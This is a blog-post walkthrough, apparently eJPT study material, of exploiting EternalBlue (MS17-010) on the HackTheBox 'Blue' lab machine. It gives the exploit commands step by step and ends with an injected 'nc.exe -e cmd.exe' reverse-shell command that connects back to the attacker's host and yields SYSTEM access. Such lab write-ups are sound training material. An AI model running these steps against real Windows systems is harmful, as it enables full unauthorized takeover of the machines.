---
layout: post
categories: [Windows]
tags: [eJPT]
---

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/Windows_icon_logo.png" height=120 width=140>

In this post, you're going to learn how to exploit the dangerous and famous **EternalBlue** vulnerability (*MS17-010*), which occurs in the SMB service of the Windows 7.

The lab of the practices is the machine **Blue** from *HackTheBox*.

For executing the shellcode in the victim machine you'll need two scripts in python, the **checker.py**, and **zzz_exploit.py**.

You can download them from this repo:
**You need other requirements from the repo so clone it, dont wget the two script!**

```sh
git clone https://github.com/worawit/MS17-010/
```

However you'll also need the nc.exe binary and creating a SMB server with smbserver.py (You can install it with the impacket suite)

First of all, we will start by checking if the SMB victim server is vulnerable, you have to execute the checker.py with python2 and giving it the host ip.

```sh
python2 checker.py 10.10.10.40
```

If it says **"status_access_denied"**, you can edit the script and where the username = ' ' , you can put **guest** and check it again.

If it gives some names with **"Ok"** (samr, lsarpc, netlogon, browser...), it means that these pipe is vulnerable.

Now it's time to modify a little bit the **zzz_exploit.py** to make it works. Edit the script, filter for **'cmd'**, comment some lines, and put your command in the cmd line like this:

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/eternalblue.png">

As you see you need to start the smb server:

```sh
smbserver.py smbFolder $(pwd) -smb2support
```

And get a copy of the nc.exe to your current directory.
The command: \\\\10.10.16.6\\smbFolder\\nc.exe -e cmd.exe 10.10.16.6 443

It connects to your smb server to the nc.exe binary and send a **cmd** to your ip to the port *443* (you have to change the ip to yours)

Start a netcat listener:

```sh
nc -nlvp 443	
```

And execute the zzz_exploit.py:
(The ip of the target and the name of the pipe, change it if doesn't work)

```sh
python zzz_exploit.py 10.10.10.40 samr
```

And you'll receive a reverse shell in the victim machine as "nt authority\\system" with full privileges.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/eternalblueshell.png">

This vulnerability is really common in CTFs and certifications like the eJPT
That's all.
